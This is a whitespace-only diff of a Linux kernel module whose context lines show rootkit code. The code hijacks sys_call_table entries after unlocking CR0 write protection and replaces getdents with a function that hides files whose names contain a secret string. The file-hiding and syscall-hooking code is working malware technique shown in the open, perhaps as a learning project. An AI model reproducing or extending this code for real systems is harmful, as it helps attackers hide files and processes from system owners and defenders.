@@ -64,7 +64,7 @@ asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
 asmlinkage long totallyReal_getdents (int fd, struct linux_dirent *dirp, int count) {
 	/* similar to sys_read, prints to log very frequently */
 	pr_info("fakeGetDents: %d %p %d\n", fd, dirp, count);
-	
+
 	int nread;
 	struct linux_dirent *mod_dirp;
 
@@ -97,7 +97,7 @@ asmlinkage long totallyReal_getdents (int fd, struct linux_dirent *dirp, int cou
 	while (off < nread) {
 		p_dirp = (void *)mod_dirp + off;
 		//pr_info("fakeGetDents: reading off address %p from copied dirp\n", p_dirp);
-		
+
 		// if filename contains secret string, remove file from struct
 		if (strstr(p_dirp->d_name, SECRET_STRING) != NULL) {
 			if (p_dirp == mod_dirp) {
@@ -129,11 +129,11 @@ void injectSyscalls(void){
 	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
 		if(toInject[targetIndex]){
 			pr_info("Starting injection for target %d\n", targetIndex);
-			
+
 			//save original ptr
 			original_syscallPtrs[targetIndex] = (void *) sys_call_table[syscall_names[targetIndex]];
 			pr_info("original ptr stored as %p\n", original_syscallPtrs[targetIndex]);
-			
+
 			//inject fake ptr
 			CR0_WRITE_UNLOCK({
 				sys_call_table[syscall_names[targetIndex]] = (unsigned long)totallyReal_syscallPtrs[targetIndex];
@@ -174,8 +174,8 @@ int __init loadMod(void){
 
 	pr_info("module loaded\n");
 	pr_info("sys_call_table pointer is %p\n", sys_call_table);
-	
-	//FOR EACH NEW SYS CALL you must... 
+
+	//FOR EACH NEW SYS CALL you must...
 	//increment numTargets, thus obtaining a free index. Then using said index:
 	syscall_names[0] = __NR_read;	//store the syscall name (is macro for index in sys_call_table)
 	totallyReal_syscallPtrs[0] = (void *) &totallyReal_read;	//store the ptr to your fake function
@@ -195,7 +195,7 @@ int __init loadMod(void){
 
 	injectSyscalls();
 
-	return 0;		
+	return 0;
 }
 
 void __exit unloadMod(void){
